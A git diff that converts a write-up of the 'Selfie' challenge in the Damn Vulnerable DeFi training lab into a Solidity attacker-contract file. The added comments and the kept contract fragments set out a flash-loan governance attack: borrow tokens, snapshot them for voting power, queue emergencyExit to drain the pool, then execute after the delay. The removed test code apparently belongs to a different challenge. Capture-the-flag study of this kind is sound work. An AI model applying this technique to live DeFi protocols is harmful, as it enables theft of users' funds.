@@ -1,37 +1,23 @@
-# #5 Selfie Damn Vulnerable Defi
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
 
-## Goals
+import "./ISimpleGovernance.sol";
+import "./SelfiePool.sol";
+import "../DamnValuableTokenSnapshot.sol";
 
-=> A new cool lending pool has launched! It’s now offering flash loans of DVT tokens. It even includes a fancy governance mechanism to control it.
+// 2000000000000000000000000 2 million token INITIAL SUPPLY of DVTS
+// 1500000000000000000000000 1.5 million token IN POOL
+// drain all tokens from the pool and transfer to the player address
 
-=> What could go wrong, right ?
+// 1. take a flash Loan for a lot of tokens
+// 2. When you receive the flashLoan we can take a snapshot to pass the hasEnoughVotes check when using the queueAction function in the governance
+// 3. create a malicious data which will call emergencyExit with the players address as input parameter
+// 4. queueAction of governance with the address of the flashLoanPool as target address, value of 0 and our malicious data field from step 3
+// 5. approve the flashLoan pool for the amount we just loaned from the pool so it can retrieve its tokens with transferFrom
+// 6. return the keccak256("ERC3156FlashBorrower.onFlashLoan") so the transactions passes in the flashLoanPool
+// 7. Wait 2 days so the 2 days threshold for executing is exceeded
+// 8. call executeAction with the correct actionId
 
-=> You start with no DVT tokens in balance, and the pool has 1.5 million. Your goal is to take them all.
-
-### Hints
-
-- None
-
-### Solution
-
-- Take a `flashLoan` for `maxFlashloan()` amount of tokens.
-
-- When you receive the flashLoan we can take a snapshot to pass the `hasEnoughVotes()` check when calling the `queueAction()` function in the governance.
-
-- Create a malicious `data` which will call `emergencyExit()` with the players address as input parameter
-
-- Call `queueAction()` of governance with the address of the flashLoanPool as target address, value of 0 and our malicious data field from step 3
-
-- Call `approve()` and aprove the flashLoan pool for the amount we just loaned from the pool so it can retrieve its tokens with `transferFrom()`
-
-- Return the keccak256("ERC3156FlashBorrower.onFlashLoan") so the transactions passes in the flashLoanPool
-
-- Wait 2 days so the 2 days threshold for executing is exceeded (evm_increaseTime in test)
-- Call `executeAction` with the correct actionId
-
-### Attacker Contract
-
-```solidity
 contract SelfieAttacker is IERC3156FlashBorrower {
     ISimpleGovernance governance;
     SelfiePool pool;
@@ -86,21 +72,3 @@ contract SelfieAttacker is IERC3156FlashBorrower {
         return keccak256("ERC3156FlashBorrower.onFlashLoan");
     }
 }
-```
-
-### Test
-
-```javascript
-it('Execution', async function () {
-	await ethers.provider.send('evm_increaseTime', [5 * 24 * 60 * 60]); // 5 days
-	const AttackerFactory = await ethers.getContractFactory('RewarderAttacker', deployer);
-	const attacker = await AttackerFactory.deploy(
-		rewardToken.address,
-		flashLoanPool.address,
-		rewarderPool.address,
-		liquidityToken.address
-	);
-	const attackTx = await attacker.connect(player).attack();
-	await attackTx.wait();
-});
-```
